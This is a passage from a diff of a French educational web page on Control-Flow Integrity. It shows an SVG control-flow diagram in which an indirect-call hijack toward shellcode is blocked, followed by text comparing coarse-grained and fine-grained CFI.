+    <text x="340" y="154" text-anchor="middle" dominant-baseline="central" style="fill:rgb(175, 169, 236);stroke:none;color:rgb(251, 251, 254);stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;opacity:1;font-family:&quot;Anthropic Sans&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, sans-serif;font-size:12px;font-weight:400;text-anchor:middle;dominant-baseline:central">init(), load_data(), compute()</text>
+  </g>
+  <line x1="340" y1="172" x2="340" y2="200" marker-end="url(#arrow)" stroke="var(--t)" style="fill:none;stroke:rgb(156, 154, 146);color:rgb(251, 251, 254);stroke-width:1.5px;stroke-linecap:butt;stroke-linejoin:miter;opacity:1;font-family:&quot;Anthropic Sans&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, sans-serif;font-size:16px;font-weight:400;text-anchor:start;dominant-baseline:auto"/>
+
+  <!-- ── CONDITION ── -->
+  <polygon points="340,200 420,232 340,264 260,232" fill="none" stroke="var(--t)" stroke-width="0.5" opacity="0.7" style="fill:none;stroke:rgb(156, 154, 146);color:rgb(251, 251, 254);stroke-width:0.5px;stroke-linecap:butt;stroke-linejoin:miter;opacity:0.7;font-family:&quot;Anthropic Sans&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, sans-serif;font-size:16px;font-weight:400;text-anchor:start;dominant-baseline:auto"/>
+  <text x="340" y="228" text-anchor="middle" dominant-baseline="central" style="fill:rgb(250, 249, 245);stroke:none;color:rgb(251, 251, 254);stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;opacity:1;font-family:&quot;Anthropic Sans&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, sans-serif;font-size:14px;font-weight:500;text-anchor:middle;dominant-baseline:central">condition ?</text>
+  <text x="428" y="232" text-anchor="start" style="fill:rgb(194, 192, 182);stroke:none;color:rgb(251, 251, 254);stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;opacity:1;font-family:&quot;Anthropic Sans&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, sans-serif;font-size:12px;font-weight:400;text-anchor:start;dominant-baseline:auto">vrai</text>
+  <text x="252" y="232" text-anchor="end" style="fill:rgb(194, 192, 182);stroke:none;color:rgb(251, 251, 254);stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;opacity:1;font-family:&quot;Anthropic Sans&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, sans-serif;font-size:12px;font-weight:400;text-anchor:end;dominant-baseline:auto">faux</text>
+
+  <!-- condition -> Bloc B (droite) -->
+  <polyline points="420,232 560,232 560,290" fill="none" stroke="var(--t)" stroke-width="0.5" marker-end="url(#arrow)" mask="url(#imagine-text-gaps-slubbw)" style="fill:none;stroke:rgb(156, 154, 146);color:rgb(251, 251, 254);stroke-width:0.5px;stroke-linecap:butt;stroke-linejoin:miter;opacity:1;font-family:&quot;Anthropic Sans&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, sans-serif;font-size:16px;font-weight:400;text-anchor:start;dominant-baseline:auto"/>
+
+  <!-- condition -> Bloc C (gauche) -->
+  <polyline points="260,232 120,232 120,290" fill="none" stroke="var(--t)" stroke-width="0.5" marker-end="url(#arrow)" mask="url(#imagine-text-gaps-slubbw)" style="fill:none;stroke:rgb(156, 154, 146);color:rgb(251, 251, 254);stroke-width:0.5px;stroke-linecap:butt;stroke-linejoin:miter;opacity:1;font-family:&quot;Anthropic Sans&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, sans-serif;font-size:16px;font-weight:400;text-anchor:start;dominant-baseline:auto"/>
+
+  <!-- ── BLOC B (branche vraie, droite) ── -->
+  <g style="fill:rgb(0, 0, 0);stroke:none;color:rgb(251, 251, 254);stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;opacity:1;font-family:&quot;Anthropic Sans&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, sans-serif;font-size:16px;font-weight:400;text-anchor:start;dominant-baseline:auto">
+    <rect x="450" y="290" width="220" height="54" rx="8" stroke-width="0.5" style="fill:rgb(8, 80, 65);stroke:rgb(93, 202, 165);color:rgb(251, 251, 254);stroke-width:0.5px;stroke-linecap:butt;stroke-linejoin:miter;opacity:1;font-family:&quot;Anthropic Sans&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, sans-serif;font-size:16px;font-weight:400;text-anchor:start;dominant-baseline:auto"/>
+    <text x="560" y="308" text-anchor="middle" dominant-baseline="central" style="fill:rgb(159, 225, 203);stroke:none;color:rgb(251, 251, 254);stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;opacity:1;font-family:&quot;Anthropic Sans&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, sans-serif;font-size:14px;font-weight:500;text-anchor:middle;dominant-baseline:central">Bloc B  (branche vraie)</text>
+    <text x="560" y="326" text-anchor="middle" dominant-baseline="central" style="fill:rgb(93, 202, 165);stroke:none;color:rgb(251, 251, 254);stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;opacity:1;font-family:&quot;Anthropic Sans&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, sans-serif;font-size:12px;font-weight:400;text-anchor:middle;dominant-baseline:central">push rbx; mov rax, [vtable]</text>
+  </g>
+
+  <!-- ── BLOC C (branche fausse, gauche) ── -->
+  <g style="fill:rgb(0, 0, 0);stroke:none;color:rgb(251, 251, 254);stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;opacity:1;font-family:&quot;Anthropic Sans&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, sans-serif;font-size:16px;font-weight:400;text-anchor:start;dominant-baseline:auto">
+    <rect x="10" y="290" width="220" height="54" rx="8" stroke-width="0.5" style="fill:rgb(8, 80, 65);stroke:rgb(93, 202, 165);color:rgb(251, 251, 254);stroke-width:0.5px;stroke-linecap:butt;stroke-linejoin:miter;opacity:1;font-family:&quot;Anthropic Sans&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, sans-serif;font-size:16px;font-weight:400;text-anchor:start;dominant-baseline:auto"/>
+    <text x="120" y="308" text-anchor="middle" dominant-baseline="central" style="fill:rgb(159, 225, 203);stroke:none;color:rgb(251, 251, 254);stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;opacity:1;font-family:&quot;Anthropic Sans&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, sans-serif;font-size:14px;font-weight:500;text-anchor:middle;dominant-baseline:central">Bloc C  (branche fausse)</text>
+    <text x="120" y="326" text-anchor="middle" dominant-baseline="central" style="fill:rgb(93, 202, 165);stroke:none;color:rgb(251, 251, 254);stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;opacity:1;font-family:&quot;Anthropic Sans&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, sans-serif;font-size:12px;font-weight:400;text-anchor:middle;dominant-baseline:central">push rbx; xor eax, eax</text>
+  </g>
+
+  <!-- ── Bloc B -> call rax ── -->
+  <line x1="560" y1="344" x2="560" y2="384" marker-end="url(#arrow)" stroke="var(--t)" style="fill:none;stroke:rgb(156, 154, 146);color:rgb(251, 251, 254);stroke-width:1.5px;stroke-linecap:butt;stroke-linejoin:miter;opacity:1;font-family:&quot;Anthropic Sans&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, sans-serif;font-size:16px;font-weight:400;text-anchor:start;dominant-baseline:auto"/>
+
+  <!-- ── CALL RAX ── -->
+  <g style="fill:rgb(0, 0, 0);stroke:none;color:rgb(251, 251, 254);stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;opacity:1;font-family:&quot;Anthropic Sans&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, sans-serif;font-size:16px;font-weight:400;text-anchor:start;dominant-baseline:auto">
+    <rect x="430" y="384" width="260" height="54" rx="8" stroke-width="0.5" style="fill:rgb(99, 56, 6);stroke:rgb(239, 159, 39);color:rgb(251, 251, 254);stroke-width:0.5px;stroke-linecap:butt;stroke-linejoin:miter;opacity:1;font-family:&quot;Anthropic Sans&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, sans-serif;font-size:16px;font-weight:400;text-anchor:start;dominant-baseline:auto"/>
+    <text x="560" y="402" text-anchor="middle" dominant-baseline="central" style="fill:rgb(250, 199, 117);stroke:none;color:rgb(251, 251, 254);stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;opacity:1;font-family:&quot;Anthropic Sans&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, sans-serif;font-size:14px;font-weight:500;text-anchor:middle;dominant-baseline:central">call rax  (branchement indirect)</text>
+    <text x="560" y="420" text-anchor="middle" dominant-baseline="central" style="fill:rgb(239, 159, 39);stroke:none;color:rgb(251, 251, 254);stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;opacity:1;font-family:&quot;Anthropic Sans&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, sans-serif;font-size:12px;font-weight:400;text-anchor:middle;dominant-baseline:central">déréférencement vtable</text>
+  </g>
+
+  <!-- label cibles -->
+  <text x="560" y="455" text-anchor="middle" style="fill:rgb(194, 192, 182);stroke:none;color:rgb(251, 251, 254);stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;opacity:1;font-family:&quot;Anthropic Sans&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, sans-serif;font-size:12px;font-weight:400;text-anchor:middle;dominant-baseline:auto">Cibles légitimes vérifiées par CFI</text>
+
+  <!-- flèches vers cibles légitimes -->
+  <line x1="510" y1="460" x2="470" y2="488" stroke="#1D9E75" stroke-width="1" marker-end="url(#arrow-green)" fill="none" mask="url(#imagine-text-gaps-slubbw)" style="fill:none;stroke:rgb(29, 158, 117);color:rgb(251, 251, 254);stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;opacity:1;font-family:&quot;Anthropic Sans&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, sans-serif;font-size:16px;font-weight:400;text-anchor:start;dominant-baseline:auto"/>
+  <line x1="560" y1="460" x2="560" y2="488" stroke="#1D9E75" stroke-width="1" marker-end="url(#arrow-green)" fill="none" mask="url(#imagine-text-gaps-slubbw)" style="fill:none;stroke:rgb(29, 158, 117);color:rgb(251, 251, 254);stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;opacity:1;font-family:&quot;Anthropic Sans&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, sans-serif;font-size:16px;font-weight:400;text-anchor:start;dominant-baseline:auto"/>
+  <line x1="610" y1="460" x2="648" y2="488" stroke="#1D9E75" stroke-width="1" marker-end="url(#arrow-green)" fill="none" mask="url(#imagine-text-gaps-slubbw)" style="fill:none;stroke:rgb(29, 158, 117);color:rgb(251, 251, 254);stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;opacity:1;font-family:&quot;Anthropic Sans&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, sans-serif;font-size:16px;font-weight:400;text-anchor:start;dominant-baseline:auto"/>
+
+  <!-- method A -->
+  <g style="fill:rgb(0, 0, 0);stroke:none;color:rgb(251, 251, 254);stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;opacity:1;font-family:&quot;Anthropic Sans&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, sans-serif;font-size:16px;font-weight:400;text-anchor:start;dominant-baseline:auto">
+    <rect x="408" y="488" width="100" height="34" rx="8" stroke-width="0.5" style="fill:rgb(8, 80, 65);stroke:rgb(93, 202, 165);color:rgb(251, 251, 254);stroke-width:0.5px;stroke-linecap:butt;stroke-linejoin:miter;opacity:1;font-family:&quot;Anthropic Sans&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, sans-serif;font-size:16px;font-weight:400;text-anchor:start;dominant-baseline:auto"/>
+    <text x="458" y="505" text-anchor="middle" dominant-baseline="central" style="fill:rgb(93, 202, 165);stroke:none;color:rgb(251, 251, 254);stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;opacity:1;font-family:&quot;Anthropic Sans&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, sans-serif;font-size:12px;font-weight:400;text-anchor:middle;dominant-baseline:central">method_A()</text>
+  </g>
+  <!-- method B -->
+  <g style="fill:rgb(0, 0, 0);stroke:none;color:rgb(251, 251, 254);stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;opacity:1;font-family:&quot;Anthropic Sans&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, sans-serif;font-size:16px;font-weight:400;text-anchor:start;dominant-baseline:auto">
+    <rect x="513" y="488" width="100" height="34" rx="8" stroke-width="0.5" style="fill:rgb(8, 80, 65);stroke:rgb(93, 202, 165);color:rgb(251, 251, 254);stroke-width:0.5px;stroke-linecap:butt;stroke-linejoin:miter;opacity:1;font-family:&quot;Anthropic Sans&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, sans-serif;font-size:16px;font-weight:400;text-anchor:start;dominant-baseline:auto"/>
+    <text x="563" y="505" text-anchor="middle" dominant-baseline="central" style="fill:rgb(93, 202, 165);stroke:none;color:rgb(251, 251, 254);stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;opacity:1;font-family:&quot;Anthropic Sans&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, sans-serif;font-size:12px;font-weight:400;text-anchor:middle;dominant-baseline:central">method_B()</text>
+  </g>
+  <!-- method C -->
+  <g style="fill:rgb(0, 0, 0);stroke:none;color:rgb(251, 251, 254);stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;opacity:1;font-family:&quot;Anthropic Sans&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, sans-serif;font-size:16px;font-weight:400;text-anchor:start;dominant-baseline:auto">
+    <rect x="618" y="488" width="52" height="34" rx="8" stroke-width="0.5" style="fill:rgb(8, 80, 65);stroke:rgb(93, 202, 165);color:rgb(251, 251, 254);stroke-width:0.5px;stroke-linecap:butt;stroke-linejoin:miter;opacity:1;font-family:&quot;Anthropic Sans&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, sans-serif;font-size:16px;font-weight:400;text-anchor:start;dominant-baseline:auto"/>
+    <text x="644" y="505" text-anchor="middle" dominant-baseline="central" style="fill:rgb(93, 202, 165);stroke:none;color:rgb(251, 251, 254);stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;opacity:1;font-family:&quot;Anthropic Sans&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, sans-serif;font-size:12px;font-weight:400;text-anchor:middle;dominant-baseline:central">mth_C()</text>
+  </g>
+
+  <!-- method_B -> EXIT -->
+  <line x1="563" y1="522" x2="563" y2="720" stroke="var(--t)" stroke-width="0.5" fill="none" style="fill:none;stroke:rgb(156, 154, 146);color:rgb(251, 251, 254);stroke-width:0.5px;stroke-linecap:butt;stroke-linejoin:miter;opacity:1;font-family:&quot;Anthropic Sans&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, sans-serif;font-size:16px;font-weight:400;text-anchor:start;dominant-baseline:auto"/>
+  <line x1="563" y1="720" x2="400" y2="760" stroke="var(--t)" stroke-width="0.5" marker-end="url(#arrow)" fill="none" style="fill:none;stroke:rgb(156, 154, 146);color:rgb(251, 251, 254);stroke-width:0.5px;stroke-linecap:butt;stroke-linejoin:miter;opacity:1;font-family:&quot;Anthropic Sans&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, sans-serif;font-size:16px;font-weight:400;text-anchor:start;dominant-baseline:auto"/>
+
+  <!-- ── Chemin interdit (call rax -> shellcode) ── -->
+  <path d="M 430 411 L 340 411 L 340 570" fill="none" stroke="#E24B4A" stroke-width="1" stroke-dasharray="5 4" marker-end="url(#arrow-red)" style="fill:none;stroke:rgb(226, 75, 74);color:rgb(251, 251, 254);stroke-width:1px;stroke-dasharray:5px, 4px;stroke-linecap:butt;stroke-linejoin:miter;opacity:1;font-family:&quot;Anthropic Sans&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, sans-serif;font-size:16px;font-weight:400;text-anchor:start;dominant-baseline:auto"/>
+
+  <!-- SHELLCODE -->
+  <g style="fill:rgb(0, 0, 0);stroke:none;color:rgb(251, 251, 254);stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;opacity:1;font-family:&quot;Anthropic Sans&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, sans-serif;font-size:16px;font-weight:400;text-anchor:start;dominant-baseline:auto">
+    <rect x="240" y="570" width="200" height="36" rx="8" stroke-width="0.5" opacity="0.8" style="fill:rgb(121, 31, 31);stroke:rgb(240, 149, 149);color:rgb(251, 251, 254);stroke-width:0.5px;stroke-linecap:butt;stroke-linejoin:miter;opacity:0.8;font-family:&quot;Anthropic Sans&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, sans-serif;font-size:16px;font-weight:400;text-anchor:start;dominant-baseline:auto"/>
+    <text x="340" y="588" text-anchor="middle" dominant-baseline="central" style="fill:rgb(240, 149, 149);stroke:none;color:rgb(251, 251, 254);stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;opacity:1;font-family:&quot;Anthropic Sans&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, sans-serif;font-size:12px;font-weight:400;text-anchor:middle;dominant-baseline:central">shellcode  (cible INTERDITE)</text>
+  </g>
+  <text x="340" y="622" text-anchor="middle" fill="#A32D2D" style="fill:rgb(194, 192, 182);stroke:none;color:rgb(251, 251, 254);stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;opacity:1;font-family:&quot;Anthropic Sans&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, sans-serif;font-size:12px;font-weight:400;text-anchor:middle;dominant-baseline:auto">violation CFI détectée : arrêt du programme</text>
+
+  <!-- ── Bloc C -> RET ── -->
+  <line x1="120" y1="344" x2="120" y2="660" stroke="var(--t)" stroke-width="0.5" marker-end="url(#arrow)" fill="none" style="fill:none;stroke:rgb(156, 154, 146);color:rgb(251, 251, 254);stroke-width:0.5px;stroke-linecap:butt;stroke-linejoin:miter;opacity:1;font-family:&quot;Anthropic Sans&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, sans-serif;font-size:16px;font-weight:400;text-anchor:start;dominant-baseline:auto"/>
+
+  <!-- RET -->
+  <g style="fill:rgb(0, 0, 0);stroke:none;color:rgb(251, 251, 254);stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;opacity:1;font-family:&quot;Anthropic Sans&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, sans-serif;font-size:16px;font-weight:400;text-anchor:start;dominant-baseline:auto">
+    <rect x="20" y="660" width="200" height="54" rx="8" stroke-width="0.5" style="fill:rgb(99, 56, 6);stroke:rgb(239, 159, 39);color:rgb(251, 251, 254);stroke-width:0.5px;stroke-linecap:butt;stroke-linejoin:miter;opacity:1;font-family:&quot;Anthropic Sans&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, sans-serif;font-size:16px;font-weight:400;text-anchor:start;dominant-baseline:auto"/>
+    <text x="120" y="678" text-anchor="middle" dominant-baseline="central" style="fill:rgb(250, 199, 117);stroke:none;color:rgb(251, 251, 254);stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;opacity:1;font-family:&quot;Anthropic Sans&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, sans-serif;font-size:14px;font-weight:500;text-anchor:middle;dominant-baseline:central">ret  (branchement indirect)</text>
+    <text x="120" y="696" text-anchor="middle" dominant-baseline="central" style="fill:rgb(239, 159, 39);stroke:none;color:rgb(251, 251, 254);stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;opacity:1;font-family:&quot;Anthropic Sans&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, sans-serif;font-size:12px;font-weight:400;text-anchor:middle;dominant-baseline:central">retour validé par CFI</text>
+  </g>
+
+  <!-- ret -> EXIT -->
+  <line x1="220" y1="687" x2="310" y2="760" stroke="var(--t)" stroke-width="0.5" marker-end="url(#arrow)" fill="none" style="fill:none;stroke:rgb(156, 154, 146);color:rgb(251, 251, 254);stroke-width:0.5px;stroke-linecap:butt;stroke-linejoin:miter;opacity:1;font-family:&quot;Anthropic Sans&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, sans-serif;font-size:16px;font-weight:400;text-anchor:start;dominant-baseline:auto"/>
+
+  <!-- ── EXIT ── -->
+  <g style="fill:rgb(0, 0, 0);stroke:none;color:rgb(251, 251, 254);stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;opacity:1;font-family:&quot;Anthropic Sans&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, sans-serif;font-size:16px;font-weight:400;text-anchor:start;dominant-baseline:auto">
+    <rect x="265" y="760" width="150" height="40" rx="8" stroke-width="0.5" style="fill:rgb(68, 68, 65);stroke:rgb(180, 178, 169);color:rgb(251, 251, 254);stroke-width:0.5px;stroke-linecap:butt;stroke-linejoin:miter;opacity:1;font-family:&quot;Anthropic Sans&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, sans-serif;font-size:16px;font-weight:400;text-anchor:start;dominant-baseline:auto"/>
+    <text x="340" y="780" text-anchor="middle" dominant-baseline="central" style="fill:rgb(211, 209, 199);stroke:none;color:rgb(251, 251, 254);stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;opacity:1;font-family:&quot;Anthropic Sans&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, sans-serif;font-size:14px;font-weight:500;text-anchor:middle;dominant-baseline:central">Exit point</text>
+  </g>
+
+  <!-- ══ LÉGENDE ══ -->
+  <line x1="40" y1="820" x2="640" y2="820" stroke="var(--t)" stroke-width="0.5" opacity="0.25" style="fill:rgb(0, 0, 0);stroke:rgb(156, 154, 146);color:rgb(251, 251, 254);stroke-width:0.5px;stroke-linecap:butt;stroke-linejoin:miter;opacity:0.25;font-family:&quot;Anthropic Sans&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, sans-serif;font-size:16px;font-weight:400;text-anchor:start;dominant-baseline:auto"/>
+  <text x="340" y="836" text-anchor="middle" opacity="0.45" style="fill:rgb(194, 192, 182);stroke:none;color:rgb(251, 251, 254);stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;opacity:0.45;font-family:&quot;Anthropic Sans&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, sans-serif;font-size:12px;font-weight:400;text-anchor:middle;dominant-baseline:auto">Légende</text>
+
+  <!-- Colonne 1 -->
+  <rect x="40" y="846" width="13" height="13" rx="3" opacity="0.9" style="fill:rgb(60, 52, 137);stroke:rgb(175, 169, 236);color:rgb(251, 251, 254);stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;opacity:0.9;font-family:&quot;Anthropic Sans&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, sans-serif;font-size:16px;font-weight:400;text-anchor:start;dominant-baseline:auto"/>
+  <text x="58" y="856" text-anchor="start" dominant-baseline="central" style="fill:rgb(194, 192, 182);stroke:none;color:rgb(251, 251, 254);stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;opacity:1;font-family:&quot;Anthropic Sans&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, sans-serif;font-size:12px;font-weight:400;text-anchor:start;dominant-baseline:central">Bloc de base</text>
+
+  <rect x="40" y="866" width="13" height="13" rx="3" opacity="0.9" style="fill:rgb(8, 80, 65);stroke:rgb(93, 202, 165);color:rgb(251, 251, 254);stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;opacity:0.9;font-family:&quot;Anthropic Sans&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, sans-serif;font-size:16px;font-weight:400;text-anchor:start;dominant-baseline:auto"/>
+  <text x="58" y="876" text-anchor="start" dominant-baseline="central" style="fill:rgb(194, 192, 182);stroke:none;color:rgb(251, 251, 254);stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;opacity:1;font-family:&quot;Anthropic Sans&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, sans-serif;font-size:12px;font-weight:400;text-anchor:start;dominant-baseline:central">Cible légitime</text>
+
+  <!-- Colonne 2 -->
+  <rect x="200" y="846" width="13" height="13" rx="3" opacity="0.9" style="fill:rgb(99, 56, 6);stroke:rgb(239, 159, 39);color:rgb(251, 251, 254);stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;opacity:0.9;font-family:&quot;Anthropic Sans&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, sans-serif;font-size:16px;font-weight:400;text-anchor:start;dominant-baseline:auto"/>
+  <text x="218" y="856" text-anchor="start" dominant-baseline="central" style="fill:rgb(194, 192, 182);stroke:none;color:rgb(251, 251, 254);stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;opacity:1;font-family:&quot;Anthropic Sans&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, sans-serif;font-size:12px;font-weight:400;text-anchor:start;dominant-baseline:central">Branchement indirect</text>
+
+  <rect x="200" y="866" width="13" height="13" rx="3" opacity="0.9" style="fill:rgb(68, 68, 65);stroke:rgb(180, 178, 169);color:rgb(251, 251, 254);stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;opacity:0.9;font-family:&quot;Anthropic Sans&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, sans-serif;font-size:16px;font-weight:400;text-anchor:start;dominant-baseline:auto"/>
+  <text x="218" y="876" text-anchor="start" dominant-baseline="central" style="fill:rgb(194, 192, 182);stroke:none;color:rgb(251, 251, 254);stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;opacity:1;font-family:&quot;Anthropic Sans&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, sans-serif;font-size:12px;font-weight:400;text-anchor:start;dominant-baseline:central">Entrée / Sortie</text>
+
+  <!-- Colonne 3 -->
+  <line x1="400" y1="852" x2="418" y2="852" stroke="#1D9E75" stroke-width="1.5" marker-end="url(#arrow-green)" style="fill:rgb(0, 0, 0);stroke:rgb(29, 158, 117);color:rgb(251, 251, 254);stroke-width:1.5px;stroke-linecap:butt;stroke-linejoin:miter;opacity:1;font-family:&quot;Anthropic Sans&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, sans-serif;font-size:16px;font-weight:400;text-anchor:start;dominant-baseline:auto"/>
+  <text x="424" y="855" text-anchor="start" dominant-baseline="central" style="fill:rgb(194, 192, 182);stroke:none;color:rgb(251, 251, 254);stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;opacity:1;font-family:&quot;Anthropic Sans&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, sans-serif;font-size:12px;font-weight:400;text-anchor:start;dominant-baseline:central">Transfert autorisé</text>
+
+  <line x1="400" y1="872" x2="418" y2="872" stroke="#E24B4A" stroke-width="1.5" stroke-dasharray="4 3" marker-end="url(#arrow-red)" style="fill:rgb(0, 0, 0);stroke:rgb(226, 75, 74);color:rgb(251, 251, 254);stroke-width:1.5px;stroke-dasharray:4px, 3px;stroke-linecap:butt;stroke-linejoin:miter;opacity:1;font-family:&quot;Anthropic Sans&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, sans-serif;font-size:16px;font-weight:400;text-anchor:start;dominant-baseline:auto"/>
+  <text x="424" y="875" text-anchor="start" dominant-baseline="central" style="fill:rgb(194, 192, 182);stroke:none;color:rgb(251, 251, 254);stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;opacity:1;font-family:&quot;Anthropic Sans&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, sans-serif;font-size:12px;font-weight:400;text-anchor:start;dominant-baseline:central">Chemin interdit</text>
+</svg>
+        </div>
+        <p data-i18n="s4_p4">
+            Le CFG peut être construit à plusieurs niveaux. La méthode la plus précise est l'analyse au niveau du compilateur (Clang/LLVM), qui dispose de toute l'information de types et peut distinguer les sites d'appel selon la signature exacte de la fonction attendue. Des analyses binaires post-compilation (comme celles effectuées par des outils de reverse engineering) sont possibles mais moins précises, car une partie de l'information de types est perdue à la compilation.
+        </p>
+
+        <!-- 05 -->
+        <h2 data-i18n="s5_h2">05 - CFI grossier vs CFI fin : la granularité</h2>
+
+        <p data-i18n="s5_p1">
+            La granularité est le paramètre le plus important d'une implémentation CFI. Elle détermine à quel point l'ensemble des cibles valides pour chaque saut indirect est restreint.
+        </p>
+
+        <h3 data-i18n="s5_h3_1">CFI grossier (coarse-grained)</h3>
+        <p data-i18n="s5_p2">
+            Un CFI grossier regroupe tous les sites d'appel indirects dans un ou quelques grands ensembles. Par exemple, il pourrait vérifier uniquement que la destination d'un <code>call indirect</code> est le début d'une fonction quelconque dans le binaire. C'est une contrainte très faible : dans un binaire typique, des centaines de fonctions sont des cibles valides, ce qui laisse beaucoup de latitude à un attaquant pour construire une chaîne d'exploitation.
+        </p>
+        <p data-i18n="s5_p3">
